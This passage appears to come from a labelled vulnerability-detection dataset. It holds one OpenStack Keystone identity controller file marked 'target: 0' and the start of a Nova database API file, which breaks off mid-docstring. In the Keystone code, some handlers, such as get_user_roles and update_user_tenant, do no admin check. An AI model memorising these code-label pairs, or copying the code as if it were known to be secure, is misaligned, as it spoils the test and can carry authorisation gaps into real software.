\"\"\"List all roles in the system.\n\n        Returns: a list of role_refs or an empty list.\n\n        \"\"\"\n        raise exception.NotImplemented()\n\n    # NOTE(termie): seven calls below should probably be exposed by the api\n    #               more clearly when the api redesign happens\n    def add_user_to_tenant(self, tenant_id, user_id):\n        raise exception.NotImplemented()\n\n    def remove_user_from_tenant(self, tenant_id, user_id):\n        raise exception.NotImplemented()\n\n    def get_all_tenants(self):\n        raise exception.NotImplemented()\n\n    def get_tenants_for_user(self, user_id):\n        \"\"\"Get the tenants associated with a given user.\n\n        Returns: a list of tenant ids.\n\n        \"\"\"\n        raise exception.NotImplemented()\n\n    def get_roles_for_user_and_tenant(self, user_id, tenant_id):\n        \"\"\"Get the roles associated with a user within given tenant.\n\n        Returns: a list of role ids.\n\n        \"\"\"\n        raise exception.NotImplemented()\n\n    def add_role_to_user_and_tenant(self, user_id, tenant_id, role_id):\n        \"\"\"Add a role to a user within given tenant.\"\"\"\n        raise exception.NotImplemented()\n\n    def remove_role_from_user_and_tenant(self, user_id, tenant_id, role_id):\n        \"\"\"Remove a role from a user within given tenant.\"\"\"\n        raise exception.NotImplemented()\n\n    # user crud\n    def create_user(self, user_id, user):\n        raise exception.NotImplemented()\n\n    def update_user(self, user_id, user):\n        raise exception.NotImplemented()\n\n    def delete_user(self, user_id):\n        raise exception.NotImplemented()\n\n    # tenant crud\n    def create_tenant(self, tenant_id, tenant):\n        raise exception.NotImplemented()\n\n    def update_tenant(self, tenant_id, tenant):\n        raise exception.NotImplemented()\n\n    def delete_tenant(self, tenant_id, tenant):\n        raise exception.NotImplemented()\n\n    # metadata crud\n\n    def get_metadata(self, user_id, tenant_id):\n        raise exception.NotImplemented()\n\n    def create_metadata(self, user_id, tenant_id, metadata):\n        raise exception.NotImplemented()\n\n    def update_metadata(self, user_id, tenant_id, metadata):\n        raise exception.NotImplemented()\n\n    def delete_metadata(self, user_id, tenant_id, metadata):\n        raise exception.NotImplemented()\n\n    # role crud\n    def create_role(self, role_id, role):\n        raise exception.NotImplemented()\n\n    def update_role(self, role_id, role):\n        raise exception.NotImplemented()\n\n    def delete_role(self, role_id):\n        raise exception.NotImplemented()\n\n\nclass PublicRouter(wsgi.ComposableRouter):\n    def add_routes(self, mapper):\n        tenant_controller = TenantController()\n        mapper.connect('/tenants',\n                       controller=tenant_controller,\n                       action='get_tenants_for_token',\n                       conditions=dict(methods=['GET']))\n\n\nclass AdminRouter(wsgi.ComposableRouter):\n    def add_routes(self, mapper):\n        # Tenant Operations\n        tenant_controller = TenantController()\n        mapper.connect('/tenants',\n                       controller=tenant_controller,\n                       action='get_all_tenants',\n                       conditions=dict(method=['GET']))\n        mapper.connect('/tenants/{tenant_id}',\n                       controller=tenant_controller,\n                       action='get_tenant',\n                       conditions=dict(method=['GET']))\n\n        # User Operations\n        user_controller = UserController()\n        mapper.connect('/users/{user_id}',\n                       controller=user_controller,\n                       action='get_user',\n                       conditions=dict(method=['GET']))\n\n        # Role Operations\n        roles_controller = RoleController()\n        mapper.connect('/tenants/{tenant_id}/users/{user_id}/roles',\n                       controller=roles_controller,\n                       action='get_user_roles',\n                       conditions=dict(method=['GET']))\n        mapper.connect('/users/{user_id}/roles',\n                       controller=user_controller,\n                       action='get_user_roles',\n                       conditions=dict(method=['GET']))\n\n\nclass TenantController(wsgi.Application):\n    def __init__(self):\n        self.identity_api = Manager()\n        self.policy_api = policy.Manager()\n        self.token_api = token.Manager()\n        super(TenantController, self).__init__()\n\n    def get_all_tenants(self, context, **kw):\n        \"\"\"Gets a list of all tenants for an admin user.\"\"\"\n        self.assert_admin(context)\n        tenant_refs = self.identity_api.get_tenants(context)\n        params = {\n            'limit': context['query_string'].get('limit'),\n            'marker': context['query_string'].get('marker'),\n        }\n        return self._format_tenant_list(tenant_refs, **params)\n\n    def get_tenants_for_token(self, context, **kw):\n        \"\"\"Get valid tenants for token based on token used to authenticate.\n\n        Pulls the token from the context, validates it and gets the valid\n        tenants for the user in the token.\n\n        Doesn't care about token scopedness.\n\n        \"\"\"\n        try:\n            token_ref = self.token_api.get_token(context=context,\n                                                 token_id=context['token_id'])\n        except exception.NotFound:\n            raise exception.Unauthorized()\n\n        user_ref = token_ref['user']\n        tenant_ids = self.identity_api.get_tenants_for_user(\n                context, user_ref['id'])\n        tenant_refs = []\n        for tenant_id in tenant_ids:\n            tenant_refs.append(self.identity_api.get_tenant(\n                    context=context,\n                    tenant_id=tenant_id))\n        params = {\n            'limit': context['query_string'].get('limit'),\n            'marker': context['query_string'].get('marker'),\n        }\n        return self._format_tenant_list(tenant_refs, **params)\n\n    def get_tenant(self, context, tenant_id):\n        # TODO(termie): this stuff should probably be moved to middleware\n        self.assert_admin(context)\n        tenant = self.identity_api.get_tenant(context, tenant_id)\n        if tenant is None:\n            raise exception.TenantNotFound(tenant_id=tenant_id)\n\n        return {'tenant': tenant}\n\n    # CRUD Extension\n    def create_tenant(self, context, tenant):\n        tenant_ref = self._normalize_dict(tenant)\n        self.assert_admin(context)\n        tenant_id = (tenant_ref.get('id')\n                     and tenant_ref.get('id')\n                     or uuid.uuid4().hex)\n        tenant_ref['id'] = tenant_id\n\n        tenant = self.identity_api.create_tenant(\n                context, tenant_id, tenant_ref)\n        return {'tenant': tenant}\n\n    def update_tenant(self, context, tenant_id, tenant):\n        self.assert_admin(context)\n        if self.identity_api.get_tenant(context, tenant_id) is None:\n            raise exception.TenantNotFound(tenant_id=tenant_id)\n\n        tenant_ref = self.identity_api.update_tenant(\n                context, tenant_id, tenant)\n        return {'tenant': tenant_ref}\n\n    def delete_tenant(self, context, tenant_id, **kw):\n        self.assert_admin(context)\n        if self.identity_api.get_tenant(context, tenant_id) is None:\n            raise exception.TenantNotFound(tenant_id=tenant_id)\n\n        self.identity_api.delete_tenant(context, tenant_id)\n\n    def get_tenant_users(self, context, tenant_id, **kw):\n        self.assert_admin(context)\n        if self.identity_api.get_tenant(context, tenant_id) is None:\n            raise exception.TenantNotFound(tenant_id=tenant_id)\n\n        user_refs = self.identity_api.get_tenant_users(context, tenant_id)\n        return {'users': user_refs}\n\n    def _format_tenant_list(self, tenant_refs, **kwargs):\n        marker = kwargs.get('marker')\n        page_idx = 0\n        if marker is not None:\n            for (marker_idx, tenant) in enumerate(tenant_refs):\n                if tenant['id'] == marker:\n                    # we start pagination after the marker\n                    page_idx = marker_idx + 1\n                    break\n            else:\n                msg = 'Marker could not be found'\n                raise exception.ValidationError(message=msg)\n\n        limit = kwargs.get('limit')\n        if limit is not None:\n            try:\n                limit = int(limit)\n                if limit < 0:\n                    raise AssertionError()\n            except (ValueError, AssertionError):\n                msg = 'Invalid limit value'\n                raise exception.ValidationError(message=msg)\n\n        tenant_refs = tenant_refs[page_idx:limit]\n\n        for x in tenant_refs:\n            if 'enabled' not in x:\n                x['enabled'] = True\n        o = {'tenants': tenant_refs,\n             'tenants_links': []}\n        return o\n\n\nclass UserController(wsgi.Application):\n    def __init__(self):\n        self.identity_api = Manager()\n        self.policy_api = policy.Manager()\n        self.token_api = token.Manager()\n        super(UserController, self).__init__()\n\n    def get_user(self, context, user_id):\n        self.assert_admin(context)\n        user_ref = self.identity_api.get_user(context, user_id)\n        if not user_ref:\n            raise exception.UserNotFound(user_id=user_id)\n\n        return {'user': user_ref}\n\n    def get_users(self, context):\n        # NOTE(termie): i can't imagine that this really wants all the data\n        #               about every single user in the system...\n        self.assert_admin(context)\n        user_refs = self.identity_api.list_users(context)\n        return {'users': user_refs}\n\n    # CRUD extension\n    def create_user(self, context, user):\n        user = self._normalize_dict(user)\n        self.assert_admin(context)\n        tenant_id = user.get('tenantId', None)\n        if (tenant_id is not None\n                and self.identity_api.get_tenant(context, tenant_id) is None):\n            raise exception.TenantNotFound(tenant_id=tenant_id)\n        user_id = uuid.uuid4().hex\n        user_ref = user.copy()\n        user_ref['id'] = user_id\n        new_user_ref = self.identity_api.create_user(\n                context, user_id, user_ref)\n        if tenant_id:\n            self.identity_api.add_user_to_tenant(context, tenant_id, user_id)\n        return {'user': new_user_ref}\n\n    def update_user(self, context, user_id, user):\n        # NOTE(termie): this is really more of a patch than a put\n        self.assert_admin(context)\n        if self.identity_api.get_user(context, user_id) is None:\n            raise exception.UserNotFound(user_id=user_id)\n\n        user_ref = self.identity_api.update_user(context, user_id, user)\n        return {'user': user_ref}\n\n    def delete_user(self, context, user_id):\n        self.assert_admin(context)\n        if self.identity_api.get_user(context, user_id) is None:\n            raise exception.UserNotFound(user_id=user_id)\n\n        self.identity_api.delete_user(context, user_id)\n\n    def set_user_enabled(self, context, user_id, user):\n        return self.update_user(context, user_id, user)\n\n    def set_user_password(self, context, user_id, user):\n        user_ref = self.update_user(context, user_id, user)\n        try:\n            for token_id in self.token_api.list_tokens(context, user_id):\n                self.token_api.delete_token(context, token_id)\n        except exception.NotImplemented:\n            # The password has been changed but tokens remain valid for\n            # backends that can't list tokens for users\n            LOG.warning('Password changed for %s, but existing tokens remain '\n                        'valid' % user_id)\n        return user_ref\n\n    def update_user_tenant(self, context, user_id, user):\n        \"\"\"Update the default tenant.\"\"\"\n        # ensure that we're a member of that tenant\n        tenant_id = user.get('tenantId')\n        self.identity_api.add_user_to_tenant(context, tenant_id, user_id)\n        return self.update_user(context, user_id, user)\n\n\nclass RoleController(wsgi.Application):\n    def __init__(self):\n        self.identity_api = Manager()\n        self.token_api = token.Manager()\n        self.policy_api = policy.Manager()\n        super(RoleController, self).__init__()\n\n    # COMPAT(essex-3)\n    def get_user_roles(self, context, user_id, tenant_id=None):\n        \"\"\"Get the roles for a user and tenant pair.\n\n        Since we're trying to ignore the idea of user-only roles we're\n        not implementing them in hopes that the idea will die off.\n\n        \"\"\"\n        if tenant_id is None:\n            raise exception.NotImplemented(message='User roles not supported: '\n                                                   'tenant ID required')\n\n        user = self.identity_api.get_user(context, user_id)\n        if user is None:\n            raise exception.UserNotFound(user_id=user_id)\n        tenant = self.identity_api.get_tenant(context, tenant_id)\n        if tenant is None:\n            raise exception.TenantNotFound(tenant_id=tenant_id)\n\n        roles = self.identity_api.get_roles_for_user_and_tenant(\n                context, user_id, tenant_id)\n        return {'roles': [self.identity_api.get_role(context, x)\n                          for x in roles]}\n\n    # CRUD extension\n    def get_role(self, context, role_id):\n        self.assert_admin(context)\n        role_ref = self.identity_api.get_role(context, role_id)\n        if not role_ref:\n            raise exception.RoleNotFound(role_id=role_id)\n        return {'role': role_ref}\n\n    def create_role(self, context, role):\n        role = self._normalize_dict(role)\n        self.assert_admin(context)\n        role_id = uuid.uuid4().hex\n        role['id'] = role_id\n        role_ref = self.identity_api.create_role(context, role_id, role)\n        return {'role': role_ref}\n\n    def delete_role(self, context, role_id):\n        self.assert_admin(context)\n        self.get_role(context, role_id)\n        self.identity_api.delete_role(context, role_id)\n\n    def get_roles(self, context):\n        self.assert_admin(context)\n        roles = self.identity_api.list_roles(context)\n        # TODO(termie): probably inefficient at some point\n        return {'roles': roles}\n\n    def add_role_to_user(self, context, user_id, role_id, tenant_id=None):\n        \"\"\"Add a role to a user and tenant pair.\n\n        Since we're trying to ignore the idea of user-only roles we're\n        not implementing them in hopes that the idea will die off.\n\n        \"\"\"\n        self.assert_admin(context)\n        if tenant_id is None:\n            raise exception.NotImplemented(message='User roles not supported: '\n                                                   'tenant_id required')\n        if self.identity_api.get_user(context, user_id) is None:\n            raise exception.UserNotFound(user_id=user_id)\n        if self.identity_api.get_tenant(context, tenant_id) is None:\n            raise exception.TenantNotFound(tenant_id=tenant_id)\n        if self.identity_api.get_role(context, role_id) is None:\n            raise exception.RoleNotFound(role_id=role_id)\n\n        # This still has the weird legacy semantics that adding a role to\n        # a user also adds them to a tenant\n        self.identity_api.add_user_to_tenant(context, tenant_id, user_id)\n        self.identity_api.add_role_to_user_and_tenant(\n                context, user_id, tenant_id, role_id)\n        role_ref = self.identity_api.get_role(context, role_id)\n        return {'role': role_ref}\n\n    def remove_role_from_user(self, context, user_id, role_id, tenant_id=None):\n        \"\"\"Remove a role from a user and tenant pair.\n\n        Since we're trying to ignore the idea of user-only roles we're\n        not implementing them in hopes that the idea will die off.\n\n        \"\"\"\n        self.assert_admin(context)\n        if tenant_id is None:\n            raise exception.NotImplemented(message='User roles not supported: '\n                                                   'tenant_id required')\n        if self.identity_api.get_user(context, user_id) is None:\n            raise exception.UserNotFound(user_id=user_id)\n        if self.identity_api.get_tenant(context, tenant_id) is None:\n            raise exception.TenantNotFound(tenant_id=tenant_id)\n        if self.identity_api.get_role(context, role_id) is None:\n            raise exception.RoleNotFound(role_id=role_id)\n\n        # This still has the weird legacy semantics that adding a role to\n        # a user also adds them to a tenant, so we must follow up on that\n        self.identity_api.remove_role_from_user_and_tenant(\n                context, user_id, tenant_id, role_id)\n        roles = self.identity_api.get_roles_for_user_and_tenant(\n                context, user_id, tenant_id)\n        if not roles:\n            self.identity_api.remove_user_from_tenant(\n                    context, tenant_id, user_id)\n        return\n\n    # COMPAT(diablo): CRUD extension\n    def get_role_refs(self, context, user_id):\n        \"\"\"Ultimate hack to get around having to make role_refs first-class.\n\n        This will basically iterate over the various roles the user has in\n        all tenants the user is a member of and create fake role_refs where\n        the id encodes the user-tenant-role information so we can look\n        up the appropriate data when we need to delete them.\n\n        \"\"\"\n        self.assert_admin(context)\n        user_ref = self.identity_api.get_user(context, user_id)\n        tenant_ids = self.identity_api.get_tenants_for_user(context, user_id)\n        o = []\n        for tenant_id in tenant_ids:\n            role_ids = self.identity_api.get_roles_for_user_and_tenant(\n                    context, user_id, tenant_id)\n            for role_id in role_ids:\n                ref = {'roleId': role_id,\n                       'tenantId': tenant_id,\n                       'userId': user_id}\n                ref['id'] = urllib.urlencode(ref)\n                o.append(ref)\n        return {'roles': o}\n\n    # COMPAT(diablo): CRUD extension\n    def create_role_ref(self, context, user_id, role):\n        \"\"\"This is actually used for adding a user to a tenant.\n\n        In the legacy data model adding a user to a tenant required setting\n        a role.\n\n        \"\"\"\n        self.assert_admin(context)\n        # TODO(termie): for now we're ignoring the actual role\n        tenant_id = role.get('tenantId')\n        role_id = role.get('roleId')\n        self.identity_api.add_user_to_tenant(context, tenant_id, user_id)\n        self.identity_api.add_role_to_user_and_tenant(\n                context, user_id, tenant_id, role_id)\n        role_ref = self.identity_api.get_role(context, role_id)\n        return {'role': role_ref}\n\n    # COMPAT(diablo): CRUD extension\n    def delete_role_ref(self, context, user_id, role_ref_id):\n        \"\"\"This is actually used for deleting a user from a tenant.\n\n        In the legacy data model removing a user from a tenant required\n        deleting a role.\n\n        To emulate this, we encode the tenant and role in the role_ref_id,\n        and if this happens to be the last role for the user-tenant pair,\n        we remove the user from the tenant.\n\n        \"\"\"\n        self.assert_admin(context)\n        # TODO(termie): for now we're ignoring the actual role\n        role_ref_ref = urlparse.parse_qs(role_ref_id)\n        tenant_id = role_ref_ref.get('tenantId')[0]\n        role_id = role_ref_ref.get('roleId')[0]\n        self.identity_api.remove_role_from_user_and_tenant(\n                context, user_id, tenant_id, role_id)\n        roles = self.identity_api.get_roles_for_user_and_tenant(\n                context, user_id, tenant_id)\n        if not roles:\n            self.identity_api.remove_user_from_tenant(\n                    context, tenant_id, user_id)\n", "target": 0}
{"idx": 1067, "func": "# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2010 United States Government as represented by the\n# Administrator of the National Aeronautics and Space Administration.\n# All Rights Reserved.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\n\"\"\"Defines interface for DB access.\n\nThe underlying driver is loaded as a :class:`LazyPluggable`.\n\n**Related Flags**\n\n:db_backend:  string to lookup in the list of LazyPluggable backends.\n              `sqlalchemy` is the only supported backend right now.\n\n:sql_connection:  string specifying the sqlalchemy connection to use, like:\n                  `sqlite:///var/lib/nova/nova.sqlite`.\n\n:enable_new_services:  when adding a new service to the database, is it in the\n                       pool of available hardware (Default: True)\n\n\"\"\"\n\nfrom nova import exception\nfrom nova import flags\nfrom nova import utils\n\n\nFLAGS = flags.FLAGS\nflags.DEFINE_string('db_backend', 'sqlalchemy',\n                    'The backend to use for db')\nflags.DEFINE_boolean('enable_new_services', True,\n                     'Services to be added to the available pool on create')\nflags.DEFINE_string('instance_name_template', 'instance-%08x',\n                    'Template string to be used to generate instance names')\nflags.DEFINE_string('volume_name_template', 'volume-%08x',\n                    'Template string to be used to generate instance names')\nflags.DEFINE_string('snapshot_name_template', 'snapshot-%08x',\n                    'Template string to be used to generate snapshot names')\nflags.DEFINE_string('vsa_name_template', 'vsa-%08x',\n                    'Template string to be used to generate VSA names')\n\nIMPL = utils.LazyPluggable(FLAGS['db_backend'],\n                           sqlalchemy='nova.db.sqlalchemy.api')\n\n\nclass NoMoreBlades(exception.Error):\n    \"\"\"No more available blades.\"\"\"\n    pass\n\n\nclass NoMoreNetworks(exception.Error):\n    \"\"\"No more available networks.\"\"\"\n    pass\n\n\nclass NoMoreTargets(exception.Error):\n    \"\"\"No more available blades\"\"\"\n    pass\n\n\n###################\n\n\ndef service_destroy(context, instance_id):\n    \"\"\"Destroy the service or raise if it does not exist.\"\"\"\n    return IMPL.service_destroy(context, instance_id)\n\n\ndef service_get(context, service_id):\n    \"\"\"Get a service or raise if it does not exist.\"\"\"\n    return IMPL.service_get(context, service_id)\n\n\ndef service_get_by_host_and_topic(context, host, topic):\n    \"\"\"Get a service by host it's on and topic it listens to.\"\"\"\n    return IMPL.service_get_by_host_and_topic(context, host, topic)\n\n\ndef service_get_all(context, disabled=None):\n    \"\"\"Get all services.\"\"\"\n    return IMPL.service_get_all(context, disabled)\n\n\ndef service_get_all_by_topic(context, topic):\n    \"\"\"Get all services for a given topic.\"\"\"\n    return IMPL.service_get_all_by_topic(context, topic)\n\n\ndef service_get_all_by_host(context, host):\n    \"\"\"Get all services for a given host.\"\"\"\n    return IMPL.service_get_all_by_host(context, host)\n\n\ndef service_get_all_compute_by_host(context, host):\n    \"\"\"Get all compute services for a given host.\"\"\"\n    return IMPL.service_get_all_compute_by_host(context, host)\n\n\ndef service_get_all_compute_sorted(context):\n    \"\"\"Get all compute services sorted by instance count.\n\n    :returns: a list of (Service, instance_count) tuples.\n\n    \"\"\"\n    return IMPL.service_get_all_compute_sorted(context)\n\n\ndef service_get_all_network_sorted(context):\n    \"\"\"Get all network services sorted by network count.\n\n    :returns: a list of (Service, network_count) tuples.\n\n    \"\"\"\n    return IMPL.service_get_all_network_sorted(context)\n\n\ndef service_get_all_volume_sorted(context):\n    \"\"\"Get all volume services sorted by volume count.\n\n    :returns: a list of (Service, volume_count) tuples.\n\n    \"\"\"\n    return IMPL.service_get_all_volume_sorted(context)\n\n\ndef service_get_by_args(context, host, binary):\n    \"\"\"Get the state of an service by node name and binary.\"\"\"\n    return IMPL.service_get_by_args(context, host, binary)\n\n\ndef service_create(context, values):\n    \"\"\"Create a service from the values dictionary.\"\"\"\n    return IMPL.service_create(context, values)\n\n\ndef service_update(context, service_id, values):\n    \"\"\"Set the given properties on an service and update it.\n\n    Raises NotFound if service does not exist.\n\n    \"\"\"\n    return IMPL.service_update(context, service_id, values)\n\n\n###################\n\n\ndef compute_node_get(context, compute_id, session=None):\n    \"\"\"Get an computeNode or raise if it does not exist.\"\"\"\n    return IMPL.compute_node_get(context, compute_id)\n\n\ndef compute_node_create(context, values):\n    \"\"\"Create a computeNode from the values dictionary.\"\"\"\n    return IMPL.compute_node_create(context, values)\n\n\ndef compute_node_update(context, compute_id, values):\n    \"\"\"Set the given properties on an computeNode and update it.\n\n    Raises NotFound if computeNode does not exist.\n\n    \"\"\"\n\n    return IMPL.compute_node_update(context, compute_id, values)\n\n\n###################\n\n\ndef certificate_create(context, values):\n    \"\"\"Create a certificate from the values dictionary.\"\"\"\n    return IMPL.certificate_create(context, values)\n\n\ndef certificate_destroy(context, certificate_id):\n    \"\"\"Destroy the certificate or raise if it does not exist.\"\"\"\n    return IMPL.certificate_destroy(context, certificate_id)\n\n\ndef certificate_get_all_by_project(context, project_id):\n    \"\"\"Get all certificates for a project.\"\"\"\n    return IMPL.certificate_get_all_by_project(context, project_id)\n\n\ndef certificate_get_all_by_user(context, user_id):\n    \"\"\"Get all certificates for a user.\"\"\"\n    return IMPL.certificate_get_all_by_user(context, user_id)\n\n\ndef certificate_get_all_by_user_and_project(context, user_id, project_id):\n    \"\"\"Get all certificates for a user and project.\"\"\"\n    return IMPL.certificate_get_all_by_user_and_project(context,\n                                                        user_id,\n                                                        project_id)\n\n\ndef certificate_update(context, certificate_id, values):\n    \"\"\"Set the given properties on an certificate and update it.\n\n    Raises NotFound if service does not exist.\n\n    \"\"\"\n    return IMPL.certificate_update(context, certificate_id, values)\n\n\n###################\n\ndef floating_ip_get(context, id):\n    return IMPL.floating_ip_get(context, id)\n\n\ndef floating_ip_allocate_address(context, project_id):\n    \"\"\"Allocate free floating ip and return the address.\n\n    Raises if one is not available.\n\n    \"\"\"\n    return IMPL.floating_ip_allocate_address(context, project_id)\n\n\ndef floating_ip_create(context, values):\n    \"\"\"Create a floating ip from the values dictionary.\"\"\"\n    return IMPL.floating_ip_create(context, values)\n\n\ndef floating_ip_count_by_project(context, project_id):\n    \"\"\"Count floating ips used by project.\"\"\"\n    return IMPL.floating_ip_count_by_project(context, project_id)\n\n\ndef floating_ip_deallocate(context, address):\n    \"\"\"Deallocate an floating ip by address.\"\"\"\n    return IMPL.floating_ip_deallocate(context, address)\n\n\ndef floating_ip_destroy(context, address):\n    \"\"\"Destroy the floating_ip or raise if it does not exist.\"\"\"\n    return IMPL.floating_ip_destroy(context, address)\n\n\ndef floating_ip_disassociate(context, address):\n    \"\"\"Disassociate an floating ip from a fixed ip by address.\n\n    :returns: the address of the existing fixed ip.\n\n    \"\"\"\n    return IMPL.floating_ip_disassociate(context, address)\n\n\ndef floating_ip_fixed_ip_associate(context, floating_address,\n                                   fixed_address, host):\n    \"\"\"Associate an floating ip to a fixed_ip by address.\"\"\"\n    return IMPL.floating_ip_fixed_ip_associate(context,\n                                               floating_address,\n                                               fixed_address,\n                                               host)\n\n\ndef floating_ip_get_all(context):\n    \"\"\"Get all floating ips.\"\"\"\n    return IMPL.floating_ip_get_all(context)\n\n\ndef floating_ip_get_all_by_host(context, host):\n    \"\"\"Get all floating ips by host.\"\"\"\n    return IMPL.floating_ip_get_all_by_host(context, host)\n\n\ndef floating_ip_get_all_by_project(context, project_id):\n    \"\"\"Get all floating ips by project.\"\"\"\n    return IMPL.floating_ip_get_all_by_project(context, project_id)\n\n\ndef floating_ip_get_by_address(context, address):\n    \"\"\"Get a floating ip by address or raise if it doesn't exist.\"\"\"\n    return IMPL.floating_ip_get_by_address(context, address)\n\n\ndef floating_ip_update(context, address, values):\n    \"\"\"Update a floating ip by address or raise if it doesn't exist.\"\"\"\n    return IMPL.floating_ip_update(context, address, values)\n\n\ndef floating_ip_set_auto_assigned(context, address):\n    \"\"\"Set auto_assigned flag to floating ip\"\"\"\n    return IMPL.floating_ip_set_auto_assigned(context, address)\n\n####################\n\n\ndef migration_update(context, id, values):\n    \"\"\"Update a migration instance.\"\"\"\n    return IMPL.migration_update(context, id, values)\n\n\ndef migration_create(context, values):\n    \"\"\"Create a migration record.\"\"\"\n    return IMPL.migration_create(context, values)\n\n\ndef migration_get(context, migration_id):\n    \"\"\"Finds a migration by the id.\"\"\"\n    return IMPL.migration_get(context, migration_id)\n\n\ndef migration_get_by_instance_and_status(context, instance_uuid, status):\n    \"\"\"Finds a migration by the instance uuid its migrating.\"\"\"\n    return IMPL.migration_get_by_instance_and_status(context, instance_uuid,\n            status)\n\n\n####################\n\n\ndef fixed_ip_associate(context, address, instance_id, network_id=None,\n                       reserved=False):\n    \"\"\"Associate fixed ip to instance.\n\n    Raises if fixed ip is not available.\n\n    \"\"\"\n    return IMPL.fixed_ip_associate(context, address, instance_id, network_id,\n                                   reserved)\n\n\ndef fixed_ip_associate_pool(context, network_id, instance_id=None, host=None):\n    \"\"\"Find free ip in network and associate it to instance or host.\n\n    Raises if one is not available.\n\n    \"\"\"\n    return IMPL.fixed_ip_associate_pool(context, network_id,\n                                        instance_id, host)\n\n\ndef fixed_ip_create(context, values):\n    \"\"\"Create a fixed ip from the values dictionary.\"\"\"\n    return IMPL.fixed_ip_create(context, values)\n\n\ndef fixed_ip_bulk_create(context, ips):\n    \"\"\"Create a lot of fixed ips from the values dictionary.\"\"\"\n    return IMPL.fixed_ip_bulk_create(context, ips)\n\n\ndef fixed_ip_disassociate(context, address):\n    \"\"\"Disassociate a fixed ip from an instance by address.\"\"\"\n    return IMPL.fixed_ip_disassociate(context, address)\n\n\ndef fixed_ip_disassociate_all_by_timeout(context, host, time):\n    \"\"\"Disassociate old fixed ips from host.\"\"\"\n    return IMPL.fixed_ip_disassociate_all_by_timeout(context, host, time)\n\n\ndef fixed_ip_get_all(context):\n    \"\"\"Get all defined fixed ips.\"\"\"\n    return IMPL.fixed_ip_get_all(context)\n\n\ndef fixed_ip_get_all_by_instance_host(context, host):\n    \"\"\"Get all allocated fixed ips filtered by instance host.\"\"\"\n    return IMPL.fixed_ip_get_all_by_instance_host(context, host)\n\n\ndef fixed_ip_get_by_address(context, address):\n    \"\"\"Get a fixed ip by address or raise if it does not exist.\"\"\"\n    return IMPL.fixed_ip_get_by_address(context, address)\n\n\ndef fixed_ip_get_by_instance(context, instance_id):\n    \"\"\"Get fixed ips by instance or raise if none exist.\"\"\"\n    return IMPL.fixed_ip_get_by_instance(context, instance_id)\n\n\ndef fixed_ip_get_by_network_host(context, network_id, host):\n    \"\"\"Get fixed ip for a host in a network.\"\"\"\n    return IMPL.fixed_ip_get_by_network_host(context, network_id, host)\n\n\ndef fixed_ip_get_by_virtual_interface(context, vif_id):\n    \"\"\"Get fixed ips by virtual interface or raise if none exist.\"\"\"\n    return IMPL.fixed_ip_get_by_virtual_interface(context, vif_id)\n\n\ndef fixed_ip_get_network(context, address):\n    \"\"\"Get a network for a fixed ip by address.\"\"\"\n    return IMPL.fixed_ip_get_network(context, address)\n\n\ndef fixed_ip_update(context, address, values):\n    \"\"\"Create a fixed ip from the values dictionary.\"\"\"\n    return IMPL.fixed_ip_update(context, address, values)\n\n####################\n\n\ndef virtual_interface_create(context, values):\n    \"\"\"Create a virtual interface record in the database.\"\"\"\n    return IMPL.virtual_interface_create(context, values)\n\n\ndef virtual_interface_update(context, vif_id, values):\n    \"\"\"Update a virtual interface record in the database.\"\"\"\n    return IMPL.virtual_interface_update(context, vif_id, values)\n\n\ndef virtual_interface_get(context, vif_id):\n    \"\"\"Gets a virtual interface from the table,\"\"\"\n    return IMPL.virtual_interface_get(context, vif_id)\n\n\ndef virtual_interface_get_by_address(context, address):\n    \"\"\"Gets a virtual interface from the table filtering on address.\"\"\"\n    return IMPL.virtual_interface_get_by_address(context, address)\n\n\ndef virtual_interface_get_by_uuid(context, vif_uuid):\n    \"\"\"Gets a virtual interface from the table filtering on vif uuid.\"\"\"\n    return IMPL.virtual_interface_get_by_uuid(context, vif_uuid)\n\n\ndef virtual_interface_get_by_fixed_ip(context, fixed_ip_id):\n    \"\"\"Gets the virtual interface fixed_ip is associated with.\"\"\"\n    return IMPL.virtual_interface_get_by_fixed_ip(context, fixed_ip_id)\n\n\ndef virtual_interface_get_by_instance(context, instance_id):\n    \"\"\"Gets all virtual_interfaces for instance.\"\"\"\n    return IMPL.virtual_interface_get_by_instance(context, instance_id)\n\n\ndef virtual_interface_get_by_instance_and_network(context, instance_id,\n                                                           network_id):\n    \"\"\"Gets all virtual interfaces for instance.\"\"\"\n    return IMPL.virtual_interface_get_by_instance_and_network(context,\n                                                              instance_id,\n                                                              network_id)\n\n\ndef virtual_interface_get_by_network(context, network_id):\n    \"\"\"Gets all virtual interfaces on network.\"\"\"\n    return IMPL.virtual_interface_get_by_network(context, network_id)\n\n\ndef virtual_interface_delete(context, vif_id):\n    \"\"\"Delete virtual interface record from the database.\"\"\"\n    return IMPL.virtual_interface_delete(context, vif_id)\n\n\ndef virtual_interface_delete_by_instance(context, instance_id):\n    \"\"\"Delete virtual interface records associated with instance.\"\"\"\n    return IMPL.virtual_interface_delete_by_instance(context, instance_id)\n\n\n####################\n\n\ndef instance_create(context, values):\n    \"\"\"Create an instance from the values dictionary.\"\"\"\n    return IMPL.instance_create(context, values)\n\n\ndef instance_data_get_for_project(context, project_id):\n    \"\"\"Get (instance_count, total_cores, total_ram) for project.\"\"\"\n    return IMPL.instance_data_get_for_project(context, project_id)\n\n\ndef instance_destroy(context, instance_id):\n    \"\"\"Destroy the instance or raise if it does not exist.\"\"\"\n    return IMPL.instance_destroy(context, instance_id)\n\n\ndef instance_stop(context, instance_id):\n    \"\"\"Stop the instance or raise if it does not exist.\"\"\"\n    return IMPL.instance_stop(context, instance_id)\n\n\ndef instance_get_by_uuid(context, uuid):\n    \"\"\"Get an instance or raise if it does not exist.\"\"\"\n    return IMPL.instance_get_by_uuid(context, uuid)\n\n\ndef instance_get(context, instance_id):\n    \"\"\"Get an instance or raise if it does not exist.\"\"\"\n    return IMPL.instance_get(context, instance_id)\n\n\ndef instance_get_all(context):\n    \"\"\"Get all instances.\"\"\"\n    return IMPL.instance_get_all(context)\n\n\ndef instance_get_all_by_filters(context, filters):\n    \"\"\"Get all instances that match all filters.\"\"\"\n    return IMPL.instance_get_all_by_filters(context, filters)\n\n\ndef instance_get_active_by_window(context, begin, end=None, project_id=None):\n    \"\"\"Get instances active during a certain time window.\n\n    Specifying a project_id 